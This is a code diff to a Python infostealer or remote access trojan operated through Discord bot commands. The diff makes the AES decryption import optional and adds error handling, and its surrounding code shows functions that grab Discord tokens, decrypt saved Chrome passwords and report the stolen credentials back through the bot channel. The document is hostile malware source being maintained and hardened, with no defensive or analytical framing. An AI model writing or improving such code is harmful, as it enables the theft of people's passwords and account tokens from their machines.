@@ -29,10 +29,17 @@ import shutil
 import glob
 import json
 import sqlite3
-from Crypto.Cipher import AES
 import win32crypt
 from PIL import ImageGrab
 import win32com.client
+
+# PyCryptodome - handle gracefully if missing
+try:
+    from Crypto.Cipher import AES
+    CRYPTO_AVAILABLE = True
+except ImportError:
+    CRYPTO_AVAILABLE = False
+    AES = None
 
 # PyAudio - optional, handle gracefully if missing
 try:
@@ -208,6 +215,9 @@ def grab_discord_tokens():
     return list(set(tokens))
 
 def get_chrome_passwords():
+    if not CRYPTO_AVAILABLE:
+        return ["pycryptodome not installed"]
+    
     chrome_path = os.path.expanduser("~") + r"\AppData\Local\Google\Chrome\User Data"
     local_state_path = os.path.join(chrome_path, "Local State")
     if not os.path.exists(local_state_path):
@@ -882,9 +892,12 @@ async def grab_tokens(ctx):
 @bot.command(name='password')
 @is_authorized()
 async def chrome_passwords(ctx):
+    if not CRYPTO_AVAILABLE:
+        await send_embed(ctx, "Error", "pycryptodome not installed - password decryption unavailable", discord.Color.red())
+        return
     await send_embed(ctx, "Dumping", "Chrome passwords...", discord.Color.blue())
     passwords = get_chrome_passwords()
-    if passwords and passwords != ["No passwords found"]:
+    if passwords and passwords != ["No passwords found"] and passwords != ["pycryptodome not installed"]:
         output = "\n".join(passwords)
         if len(output) > 1900:
             with open("passwords.txt", "w", encoding='utf-8') as f:
@@ -894,7 +907,7 @@ async def chrome_passwords(ctx):
         else:
             await send_embed(ctx, "Chrome Passwords", f"```{output[:1500]}```", discord.Color.green())
     else:
-        await send_embed(ctx, "Passwords", "None found or Chrome not installed", discord.Color.red())
+        await send_embed(ctx, "Passwords", passwords[0] if passwords else "None found", discord.Color.red())
 
 @bot.command(name='idletime')
 @is_authorized()
